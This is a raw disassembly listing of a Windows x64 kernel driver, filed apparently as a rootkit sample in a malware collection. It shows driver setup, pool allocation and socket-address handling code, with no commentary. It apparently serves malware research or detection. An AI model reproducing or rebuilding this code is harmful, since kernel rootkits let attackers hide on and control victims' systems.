
malware_samples/rootkit/e8e7f2f889948fd977b5941e6897921da28c8898a9ca1379816d9f3fa9bc40ff.sys:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d e5 90 00 00 	lea    0x90e5(%rip),%rcx        # 0x14000a0f0
   14000100b:	e8 c0 01 00 00       	call   0x1400011d0
   140001010:	4c 8b 05 31 21 01 00 	mov    0x12131(%rip),%r8        # 0x140013148
   140001017:	48 8d 15 d2 90 00 00 	lea    0x90d2(%rip),%rdx        # 0x14000a0f0
   14000101e:	48 8d 0d 03 21 01 00 	lea    0x12103(%rip),%rcx        # 0x140013128
   140001025:	48 83 c4 28          	add    $0x28,%rsp
   140001029:	e9 92 60 00 00       	jmp    0x1400070c0
   14000102e:	cc                   	int3
   14000102f:	cc                   	int3
   140001030:	e9 cb ff ff ff       	jmp    0x140001000
   140001035:	cc                   	int3
   140001036:	cc                   	int3
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 83 ec 28          	sub    $0x28,%rsp
   140001044:	48 8b 05 ed 20 01 00 	mov    0x120ed(%rip),%rax        # 0x140013138
   14000104b:	48 85 c0             	test   %rax,%rax
   14000104e:	74 0e                	je     0x14000105e
   140001050:	48 8d 15 e9 ff ff ff 	lea    -0x17(%rip),%rdx        # 0x140001040
   140001057:	48 3b c2             	cmp    %rdx,%rax
   14000105a:	74 02                	je     0x14000105e
   14000105c:	ff d0                	call   *%rax
   14000105e:	48 83 c4 28          	add    $0x28,%rsp
   140001062:	e9 99 ff ff ff       	jmp    0x140001000
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001075:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000107a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000107f:	57                   	push   %rdi
   140001080:	48 83 ec 20          	sub    $0x20,%rsp
   140001084:	33 ed                	xor    %ebp,%ebp
   140001086:	48 8b f2             	mov    %rdx,%rsi
   140001089:	48 8b f9             	mov    %rcx,%rdi
   14000108c:	48 3b cd             	cmp    %rbp,%rcx
   14000108f:	75 0c                	jne    0x14000109d
   140001091:	33 c9                	xor    %ecx,%ecx
   140001093:	e8 88 2b 00 00       	call   0x140003c20
   140001098:	e9 e0 00 00 00       	jmp    0x14000117d
   14000109d:	b8 08 02 00 00       	mov    $0x208,%eax
   1400010a2:	48 89 0d a7 20 01 00 	mov    %rcx,0x120a7(%rip)        # 0x140013150
   1400010a9:	48 8d 0d 78 20 01 00 	lea    0x12078(%rip),%rcx        # 0x140013128
   1400010b0:	66 89 05 73 20 01 00 	mov    %ax,0x12073(%rip)        # 0x14001312a
   1400010b7:	48 8d 05 a2 20 01 00 	lea    0x120a2(%rip),%rax        # 0x140013160
   1400010be:	66 89 2d 63 20 01 00 	mov    %bp,0x12063(%rip)        # 0x140013128
   1400010c5:	48 89 05 64 20 01 00 	mov    %rax,0x12064(%rip)        # 0x140013130
   1400010cc:	ff 15 5e 72 00 00    	call   *0x725e(%rip)        # 0x140008330
   1400010d2:	4c 8d 0d 6f 20 01 00 	lea    0x1206f(%rip),%r9        # 0x140013148
   1400010d9:	4c 8d 05 10 90 00 00 	lea    0x9010(%rip),%r8        # 0x14000a0f0
   1400010e0:	48 8d 15 41 20 01 00 	lea    0x12041(%rip),%rdx        # 0x140013128
   1400010e7:	48 8b cf             	mov    %rdi,%rcx
   1400010ea:	e8 e1 5f 00 00       	call   0x1400070d0
   1400010ef:	3b c5                	cmp    %ebp,%eax
   1400010f1:	0f 8c 86 00 00 00    	jl     0x14000117d
   1400010f7:	48 8d 0d f2 8f 00 00 	lea    0x8ff2(%rip),%rcx        # 0x14000a0f0
   1400010fe:	e8 4d 01 00 00       	call   0x140001250
   140001103:	3b c5                	cmp    %ebp,%eax
   140001105:	8b d8                	mov    %eax,%ebx
   140001107:	7c 6d                	jl     0x140001176
   140001109:	e8 d2 01 00 00       	call   0x1400012e0
   14000110e:	48 8b d6             	mov    %rsi,%rdx
   140001111:	48 8b cf             	mov    %rdi,%rcx
   140001114:	e8 07 2b 00 00       	call   0x140003c20
   140001119:	3b c5                	cmp    %ebp,%eax
   14000111b:	8b d8                	mov    %eax,%ebx
   14000111d:	7c 57                	jl     0x140001176
   14000111f:	48 8b 05 22 20 01 00 	mov    0x12022(%rip),%rax        # 0x140013148
   140001126:	40 38 68 30          	cmp    %bpl,0x30(%rax)
   14000112a:	74 24                	je     0x140001150
   14000112c:	48 8b 05 05 20 01 00 	mov    0x12005(%rip),%rax        # 0x140013138
   140001133:	48 39 6f 68          	cmp    %rbp,0x68(%rdi)
   140001137:	48 0f 45 47 68       	cmovne 0x68(%rdi),%rax
   14000113c:	48 89 05 f5 1f 01 00 	mov    %rax,0x11ff5(%rip)        # 0x140013138
   140001143:	48 8d 05 f6 fe ff ff 	lea    -0x10a(%rip),%rax        # 0x140001040
   14000114a:	48 89 47 68          	mov    %rax,0x68(%rdi)
   14000114e:	eb 22                	jmp    0x140001172
   140001150:	f6 40 08 02          	testb  $0x2,0x8(%rax)
   140001154:	74 1c                	je     0x140001172
   140001156:	48 8b 05 ab 19 01 00 	mov    0x119ab(%rip),%rax        # 0x140012b08
   14000115d:	48 89 05 dc 1f 01 00 	mov    %rax,0x11fdc(%rip)        # 0x140013140
   140001164:	48 8d 05 c5 fe ff ff 	lea    -0x13b(%rip),%rax        # 0x140001030
   14000116b:	48 89 05 96 19 01 00 	mov    %rax,0x11996(%rip)        # 0x140012b08
   140001172:	33 c0                	xor    %eax,%eax
   140001174:	eb 07                	jmp    0x14000117d
   140001176:	e8 85 fe ff ff       	call   0x140001000
   14000117b:	8b c3                	mov    %ebx,%eax
   14000117d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001182:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001187:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000118c:	48 83 c4 20          	add    $0x20,%rsp
   140001190:	5f                   	pop    %rdi
   140001191:	c3                   	ret
   140001192:	cc                   	int3
   140001193:	cc                   	int3
   140001194:	cc                   	int3
   140001195:	cc                   	int3
   140001196:	cc                   	int3
   140001197:	cc                   	int3
   140001198:	cc                   	int3
   140001199:	cc                   	int3
   14000119a:	cc                   	int3
   14000119b:	cc                   	int3
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400011a5:	57                   	push   %rdi
   1400011a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011aa:	48 8b da             	mov    %rdx,%rbx
   1400011ad:	48 8b f9             	mov    %rcx,%rdi
   1400011b0:	e8 4b 3e 01 00       	call   0x140015000
   1400011b5:	48 8b d3             	mov    %rbx,%rdx
   1400011b8:	48 8b cf             	mov    %rdi,%rcx
   1400011bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011c0:	48 83 c4 20          	add    $0x20,%rsp
   1400011c4:	5f                   	pop    %rdi
   1400011c5:	e9 a6 fe ff ff       	jmp    0x140001070
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400011d5:	57                   	push   %rdi
   1400011d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011da:	48 8b 05 57 8f 00 00 	mov    0x8f57(%rip),%rax        # 0x14000a138
   1400011e1:	48 8b f9             	mov    %rcx,%rdi
   1400011e4:	48 8d 0d 35 8f 00 00 	lea    0x8f35(%rip),%rcx        # 0x14000a120
   1400011eb:	48 8d 1d 3e 8f 00 00 	lea    0x8f3e(%rip),%rbx        # 0x14000a130
   1400011f2:	48 3b c1             	cmp    %rcx,%rax
   1400011f5:	74 45                	je     0x14000123c
   1400011f7:	48 3b d8             	cmp    %rax,%rbx
   1400011fa:	77 40                	ja     0x14000123c
   1400011fc:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140001200:	48 85 c0             	test   %rax,%rax
   140001203:	74 18                	je     0x14000121d
   140001205:	4c 8b 05 3c 1f 01 00 	mov    0x11f3c(%rip),%r8        # 0x140013148
   14000120c:	48 8d 0d dd 5e 00 00 	lea    0x5edd(%rip),%rcx        # 0x1400070f0
   140001213:	4c 8b cb             	mov    %rbx,%r9
   140001216:	48 8b d7             	mov    %rdi,%rdx
   140001219:	ff d0                	call   *%rax
   14000121b:	eb 12                	jmp    0x14000122f
   14000121d:	48 8b 15 24 1f 01 00 	mov    0x11f24(%rip),%rdx        # 0x140013148
   140001224:	4c 8b c3             	mov    %rbx,%r8
   140001227:	48 8b cf             	mov    %rdi,%rcx
   14000122a:	e8 c1 5e 00 00       	call   0x1400070f0
   14000122f:	48 83 c3 50          	add    $0x50,%rbx
   140001233:	48 3b 1d fe 8e 00 00 	cmp    0x8efe(%rip),%rbx        # 0x14000a138
   14000123a:	76 c0                	jbe    0x1400011fc
   14000123c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001241:	48 83 c4 20          	add    $0x20,%rsp
   140001245:	5f                   	pop    %rdi
   140001246:	c3                   	ret
   140001247:	cc                   	int3
   140001248:	cc                   	int3
   140001249:	cc                   	int3
   14000124a:	cc                   	int3
   14000124b:	cc                   	int3
   14000124c:	cc                   	int3
   14000124d:	cc                   	int3
   14000124e:	cc                   	int3
   14000124f:	cc                   	int3
   140001250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001255:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000125a:	57                   	push   %rdi
   14000125b:	48 83 ec 20          	sub    $0x20,%rsp
   14000125f:	48 8b f9             	mov    %rcx,%rdi
   140001262:	33 c0                	xor    %eax,%eax
   140001264:	48 8d 1d c5 8e 00 00 	lea    0x8ec5(%rip),%rbx        # 0x14000a130
   14000126b:	48 8d 35 be 8e 00 00 	lea    0x8ebe(%rip),%rsi        # 0x14000a130
   140001272:	48 3b de             	cmp    %rsi,%rbx
   140001275:	73 4e                	jae    0x1400012c5
   140001277:	83 3b 50             	cmpl   $0x50,(%rbx)
   14000127a:	75 44                	jne    0x1400012c0
   14000127c:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140001280:	48 89 1d b1 8e 00 00 	mov    %rbx,0x8eb1(%rip)        # 0x14000a138
   140001287:	48 85 c0             	test   %rax,%rax
   14000128a:	74 18                	je     0x1400012a4
   14000128c:	4c 8b 05 b5 1e 01 00 	mov    0x11eb5(%rip),%r8        # 0x140013148
   140001293:	48 8d 0d 46 5e 00 00 	lea    0x5e46(%rip),%rcx        # 0x1400070e0
   14000129a:	4c 8b cb             	mov    %rbx,%r9
   14000129d:	48 8b d7             	mov    %rdi,%rdx
   1400012a0:	ff d0                	call   *%rax
   1400012a2:	eb 12                	jmp    0x1400012b6
   1400012a4:	48 8b 15 9d 1e 01 00 	mov    0x11e9d(%rip),%rdx        # 0x140013148
   1400012ab:	4c 8b c3             	mov    %rbx,%r8
   1400012ae:	48 8b cf             	mov    %rdi,%rcx
   1400012b1:	e8 2a 5e 00 00       	call   0x1400070e0
   1400012b6:	85 c0                	test   %eax,%eax
   1400012b8:	78 0b                	js     0x1400012c5
   1400012ba:	48 83 c3 50          	add    $0x50,%rbx
   1400012be:	eb b2                	jmp    0x140001272
   1400012c0:	b8 04 00 00 c0       	mov    $0xc0000004,%eax
   1400012c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012ca:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400012cf:	48 83 c4 20          	add    $0x20,%rsp
   1400012d3:	5f                   	pop    %rdi
   1400012d4:	c3                   	ret
   1400012d5:	cc                   	int3
   1400012d6:	cc                   	int3
   1400012d7:	cc                   	int3
   1400012d8:	cc                   	int3
   1400012d9:	cc                   	int3
   1400012da:	cc                   	int3
   1400012db:	cc                   	int3
   1400012dc:	cc                   	int3
   1400012dd:	cc                   	int3
   1400012de:	cc                   	int3
   1400012df:	cc                   	int3
   1400012e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400012e5:	57                   	push   %rdi
   1400012e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012ea:	48 8d 05 5f 8e 00 00 	lea    0x8e5f(%rip),%rax        # 0x14000a150
   1400012f1:	48 8d 0d 58 8e 00 00 	lea    0x8e58(%rip),%rcx        # 0x14000a150
   1400012f8:	48 3b c1             	cmp    %rcx,%rax
   1400012fb:	73 3c                	jae    0x140001339
   1400012fd:	48 2b c8             	sub    %rax,%rcx
   140001300:	48 b8 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rax
   140001307:	cc cc cc 
   14000130a:	48 8d 1d 5f 8e 00 00 	lea    0x8e5f(%rip),%rbx        # 0x14000a170
   140001311:	48 ff c9             	dec    %rcx
   140001314:	48 f7 e1             	mul    %rcx
   140001317:	48 8b fa             	mov    %rdx,%rdi
   14000131a:	48 c1 ef 05          	shr    $0x5,%rdi
   14000131e:	48 ff c7             	inc    %rdi
   140001321:	48 8b 03             	mov    (%rbx),%rax
   140001324:	48 85 c0             	test   %rax,%rax
   140001327:	74 06                	je     0x14000132f
   140001329:	ff d0                	call   *%rax
   14000132b:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   14000132f:	48 83 c3 28          	add    $0x28,%rbx
   140001333:	48 83 ef 01          	sub    $0x1,%rdi
   140001337:	75 e8                	jne    0x140001321
   140001339:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000133e:	48 83 c4 20          	add    $0x20,%rsp
   140001342:	5f                   	pop    %rdi
   140001343:	c3                   	ret
   140001344:	cc                   	int3
   140001345:	cc                   	int3
   140001346:	cc                   	int3
   140001347:	cc                   	int3
   140001348:	cc                   	int3
   140001349:	cc                   	int3
   14000134a:	cc                   	int3
   14000134b:	cc                   	int3
   14000134c:	cc                   	int3
   14000134d:	cc                   	int3
   14000134e:	cc                   	int3
   14000134f:	cc                   	int3
   140001350:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001355:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000135a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000135f:	41 56                	push   %r14
   140001361:	48 83 ec 40          	sub    $0x40,%rsp
   140001365:	4c 8b f2             	mov    %rdx,%r14
   140001368:	48 8b f1             	mov    %rcx,%rsi
   14000136b:	48 85 c9             	test   %rcx,%rcx
   14000136e:	75 0a                	jne    0x14000137a
   140001370:	48 21 0a             	and    %rcx,(%rdx)
   140001373:	33 c0                	xor    %eax,%eax
   140001375:	e9 d5 00 00 00       	jmp    0x14000144f
   14000137a:	bf 48 00 00 00       	mov    $0x48,%edi
   14000137f:	41 b8 4b 73 62 77    	mov    $0x7762734b,%r8d
   140001385:	8b d7                	mov    %edi,%edx
   140001387:	8d 4f b9             	lea    -0x47(%rdi),%ecx
   14000138a:	ff 15 80 6f 00 00    	call   *0x6f80(%rip)        # 0x140008310
   140001390:	48 8b d8             	mov    %rax,%rbx
   140001393:	48 85 c0             	test   %rax,%rax
   140001396:	0f 84 ac 00 00 00    	je     0x140001448
   14000139c:	48 8b c8             	mov    %rax,%rcx
   14000139f:	ff 15 23 6e 00 00    	call   *0x6e23(%rip)        # 0x1400081c8
   1400013a5:	84 c0                	test   %al,%al
   1400013a7:	0f 84 9b 00 00 00    	je     0x140001448
   1400013ad:	44 8b c7             	mov    %edi,%r8d
   1400013b0:	33 d2                	xor    %edx,%edx
   1400013b2:	48 8b cb             	mov    %rbx,%rcx
   1400013b5:	e8 86 5d 00 00       	call   0x140007140
   1400013ba:	8b 0e                	mov    (%rsi),%ecx
   1400013bc:	89 0b                	mov    %ecx,(%rbx)
   1400013be:	8b 46 04             	mov    0x4(%rsi),%eax
   1400013c1:	89 43 04             	mov    %eax,0x4(%rbx)
   1400013c4:	8b 46 08             	mov    0x8(%rsi),%eax
   1400013c7:	89 43 08             	mov    %eax,0x8(%rbx)
   1400013ca:	8b 46 0c             	mov    0xc(%rsi),%eax
   1400013cd:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400013d0:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400013d4:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400013d8:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   1400013dc:	48 85 d2             	test   %rdx,%rdx
   1400013df:	74 2d                	je     0x14000140e
   1400013e1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400013e6:	ff 15 5c 6f 00 00    	call   *0x6f5c(%rip)        # 0x140008348
   1400013ec:	41 b0 01             	mov    $0x1,%r8b
   1400013ef:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400013f4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400013f9:	ff 15 39 6f 00 00    	call   *0x6f39(%rip)        # 0x140008338
   1400013ff:	8b f8                	mov    %eax,%edi
   140001401:	85 c0                	test   %eax,%eax
   140001403:	78 25                	js     0x14000142a
   140001405:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000140a:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000140e:	48 8b 46 20          	mov    0x20(%rsi),%rax
   140001412:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001417:	48 89 43 20          	mov    %rax,0x20(%rbx)
   14000141b:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   14000141f:	e8 2c ff ff ff       	call   0x140001350
   140001424:	8b f8                	mov    %eax,%edi
   140001426:	85 c0                	test   %eax,%eax
   140001428:	79 10                	jns    0x14000143a
   14000142a:	ba 4b 73 62 77       	mov    $0x7762734b,%edx
   14000142f:	48 8b cb             	mov    %rbx,%rcx
   140001432:	ff 15 d0 6e 00 00    	call   *0x6ed0(%rip)        # 0x140008308
   140001438:	eb 13                	jmp    0x14000144d
   14000143a:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000143f:	48 89 43 40          	mov    %rax,0x40(%rbx)
   140001443:	49 89 1e             	mov    %rbx,(%r14)
   140001446:	eb 05                	jmp    0x14000144d
   140001448:	bf 9a 00 00 c0       	mov    $0xc000009a,%edi
   14000144d:	8b c7                	mov    %edi,%eax
   14000144f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001454:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140001459:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000145e:	48 83 c4 40          	add    $0x40,%rsp
   140001462:	41 5e                	pop    %r14
   140001464:	c3                   	ret
   140001465:	cc                   	int3
   140001466:	cc                   	int3
   140001467:	cc                   	int3
   140001468:	40 53                	rex push %rbx
   14000146a:	48 83 ec 30          	sub    $0x30,%rsp
   14000146e:	48 8b d9             	mov    %rcx,%rbx
   140001471:	48 8b 49 40          	mov    0x40(%rcx),%rcx
   140001475:	48 85 c9             	test   %rcx,%rcx
   140001478:	74 05                	je     0x14000147f
   14000147a:	e8 e9 ff ff ff       	call   0x140001468
   14000147f:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140001483:	48 85 d2             	test   %rdx,%rdx
   140001486:	74 0b                	je     0x140001493
   140001488:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000148d:	ff 15 ad 6e 00 00    	call   *0x6ead(%rip)        # 0x140008340
   140001493:	ba 4b 73 62 77       	mov    $0x7762734b,%edx
   140001498:	48 8b cb             	mov    %rbx,%rcx
   14000149b:	48 83 c4 30          	add    $0x30,%rsp
   14000149f:	5b                   	pop    %rbx
   1400014a0:	48 ff 25 61 6e 00 00 	rex.W jmp *0x6e61(%rip)        # 0x140008308
   1400014a7:	cc                   	int3
   1400014a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400014ad:	57                   	push   %rdi
   1400014ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400014b2:	48 63 d9             	movslq %ecx,%rbx
   1400014b5:	48 8d 3d a4 8c 00 00 	lea    0x8ca4(%rip),%rdi        # 0x14000a160
   1400014bc:	48 8b 4c df f8       	mov    -0x8(%rdi,%rbx,8),%rcx
   1400014c1:	e8 be 19 00 00       	call   0x140002e84
   1400014c6:	33 c9                	xor    %ecx,%ecx
   1400014c8:	85 c0                	test   %eax,%eax
   1400014ca:	48 89 4c df f8       	mov    %rcx,-0x8(%rdi,%rbx,8)
   1400014cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400014d4:	0f 99 c1             	setns  %cl
   1400014d7:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1400014da:	48 83 c4 20          	add    $0x20,%rsp
   1400014de:	5f                   	pop    %rdi
   1400014df:	c3                   	ret
   1400014e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400014e4:	48 63 c1             	movslq %ecx,%rax
   1400014e7:	48 8d 0d 72 8c 00 00 	lea    0x8c72(%rip),%rcx        # 0x14000a160
   1400014ee:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   1400014f3:	e8 08 1a 00 00       	call   0x140002f00
   1400014f8:	33 c9                	xor    %ecx,%ecx
   1400014fa:	85 c0                	test   %eax,%eax
   1400014fc:	0f 99 c1             	setns  %cl
   1400014ff:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140001502:	48 83 c4 28          	add    $0x28,%rsp
   140001506:	c3                   	ret
   140001507:	cc                   	int3
   140001508:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000150d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001512:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001517:	55                   	push   %rbp
   140001518:	41 56                	push   %r14
   14000151a:	41 57                	push   %r15
   14000151c:	48 8b ec             	mov    %rsp,%rbp
   14000151f:	48 83 ec 70          	sub    $0x70,%rsp
   140001523:	45 33 ff             	xor    %r15d,%r15d
   140001526:	49 8b f9             	mov    %r9,%rdi
   140001529:	44 89 7d d8          	mov    %r15d,-0x28(%rbp)
   14000152d:	49 8b f0             	mov    %r8,%rsi
   140001530:	4c 89 7d e0          	mov    %r15,-0x20(%rbp)
   140001534:	4c 8b f2             	mov    %rdx,%r14
   140001537:	44 89 7d c8          	mov    %r15d,-0x38(%rbp)
   14000153b:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   14000153f:	44 89 7d e8          	mov    %r15d,-0x18(%rbp)
   140001543:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   140001547:	44 89 7d b8          	mov    %r15d,-0x48(%rbp)
   14000154b:	4c 89 7d c0          	mov    %r15,-0x40(%rbp)
   14000154f:	48 85 c9             	test   %rcx,%rcx
   140001552:	0f 84 15 01 00 00    	je     0x14000166d
   140001558:	48 85 d2             	test   %rdx,%rdx
   14000155b:	0f 84 0c 01 00 00    	je     0x14000166d
   140001561:	4d 85 c0             	test   %r8,%r8
   140001564:	0f 84 03 01 00 00    	je     0x14000166d
   14000156a:	4d 85 c9             	test   %r9,%r9
   14000156d:	0f 84 fa 00 00 00    	je     0x14000166d
   140001573:	48 8b d1             	mov    %rcx,%rdx
   140001576:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   14000157a:	ff 15 c8 6d 00 00    	call   *0x6dc8(%rip)        # 0x140008348
   140001580:	41 b0 01             	mov    $0x1,%r8b
   140001583:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140001587:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   14000158b:	ff 15 a7 6d 00 00    	call   *0x6da7(%rip)        # 0x140008338
   140001591:	8b d8                	mov    %eax,%ebx
   140001593:	85 c0                	test   %eax,%eax
   140001595:	0f 88 ce 00 00 00    	js     0x140001669
   14000159b:	49 8b d6             	mov    %r14,%rdx
   14000159e:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400015a2:	ff 15 a0 6d 00 00    	call   *0x6da0(%rip)        # 0x140008348
   1400015a8:	41 b0 01             	mov    $0x1,%r8b
   1400015ab:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   1400015af:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400015b3:	ff 15 7f 6d 00 00    	call   *0x6d7f(%rip)        # 0x140008338
   1400015b9:	8b d8                	mov    %eax,%ebx
   1400015bb:	85 c0                	test   %eax,%eax
   1400015bd:	0f 88 96 00 00 00    	js     0x140001659
   1400015c3:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   1400015c7:	48 8b ce             	mov    %rsi,%rcx
   1400015ca:	e8 81 fd ff ff       	call   0x140001350
   1400015cf:	8b d8                	mov    %eax,%ebx
   1400015d1:	85 c0                	test   %eax,%eax
   1400015d3:	78 74                	js     0x140001649
   1400015d5:	4c 8b 45 20          	mov    0x20(%rbp),%r8
   1400015d9:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   1400015dd:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   1400015e1:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   1400015e5:	e8 56 1b 00 00       	call   0x140003140
   1400015ea:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400015ee:	8b d8                	mov    %eax,%ebx
   1400015f0:	e8 73 fe ff ff       	call   0x140001468
   1400015f5:	85 db                	test   %ebx,%ebx
   1400015f7:	78 50                	js     0x140001649
   1400015f9:	4c 8b 45 b0          	mov    -0x50(%rbp),%r8
   1400015fd:	45 8d 4f 04          	lea    0x4(%r15),%r9d
   140001601:	49 8b 40 20          	mov    0x20(%r8),%rax
   140001605:	0f b7 10             	movzwl (%rax),%edx
   140001608:	66 89 17             	mov    %dx,(%rdi)
   14000160b:	49 8b 40 20          	mov    0x20(%r8),%rax
   14000160f:	0f b7 48 02          	movzwl 0x2(%rax),%ecx
   140001613:	41 8d 47 08          	lea    0x8(%r15),%eax
   140001617:	66 89 4f 02          	mov    %cx,0x2(%rdi)
   14000161b:	49 8b 48 20          	mov    0x20(%r8),%rcx
   14000161f:	66 83 39 17          	cmpw   $0x17,(%rcx)
   140001623:	41 0f 45 c1          	cmovne %r9d,%eax
   140001627:	66 83 fa 17          	cmp    $0x17,%dx
   14000162b:	75 0b                	jne    0x140001638
   14000162d:	0f 10 04 08          	movups (%rax,%rcx,1),%xmm0
   140001631:	f3 0f 7f 47 08       	movdqu %xmm0,0x8(%rdi)
   140001636:	eb 06                	jmp    0x14000163e
   140001638:	8b 04 08             	mov    (%rax,%rcx,1),%eax
   14000163b:	89 47 04             	mov    %eax,0x4(%rdi)
   14000163e:	49 8b c8             	mov    %r8,%rcx
   140001641:	e8 de 1a 00 00       	call   0x140003124
   140001646:	41 8b df             	mov    %r15d,%ebx
   140001649:	4c 39 7d c0          	cmp    %r15,-0x40(%rbp)
   14000164d:	74 0a                	je     0x140001659
   14000164f:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140001653:	ff 15 c7 6c 00 00    	call   *0x6cc7(%rip)        # 0x140008320
   140001659:	4c 39 7d d0          	cmp    %r15,-0x30(%rbp)
   14000165d:	74 0a                	je     0x140001669
   14000165f:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140001663:	ff 15 b7 6c 00 00    	call   *0x6cb7(%rip)        # 0x140008320
   140001669:	8b c3                	mov    %ebx,%eax
   14000166b:	eb 03                	jmp    0x140001670
   14000166d:	83 c8 ff             	or     $0xffffffff,%eax
   140001670:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140001675:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001679:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000167d:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140001681:	49 8b e3             	mov    %r11,%rsp
   140001684:	41 5f                	pop    %r15
   140001686:	41 5e                	pop    %r14
   140001688:	5d                   	pop    %rbp
   140001689:	c3                   	ret
   14000168a:	cc                   	int3
   14000168b:	cc                   	int3
   14000168c:	48 83 ec 28          	sub    $0x28,%rsp
   140001690:	48 63 c1             	movslq %ecx,%rax
   140001693:	48 8d 0d c6 8a 00 00 	lea    0x8ac6(%rip),%rcx        # 0x14000a160
   14000169a:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000169f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400016a4:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   1400016a9:	e8 92 1b 00 00       	call   0x140003240
   1400016ae:	83 c9 ff             	or     $0xffffffff,%ecx
   1400016b1:	85 c0                	test   %eax,%eax
   1400016b3:	0f 49 4c 24 30       	cmovns 0x30(%rsp),%ecx
   1400016b8:	8b c1                	mov    %ecx,%eax
   1400016ba:	48 83 c4 28          	add    $0x28,%rsp
   1400016be:	c3                   	ret
   1400016bf:	cc                   	int3
   1400016c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400016c4:	48 63 c1             	movslq %ecx,%rax
   1400016c7:	48 8d 0d 92 8a 00 00 	lea    0x8a92(%rip),%rcx        # 0x14000a160
   1400016ce:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   1400016d3:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
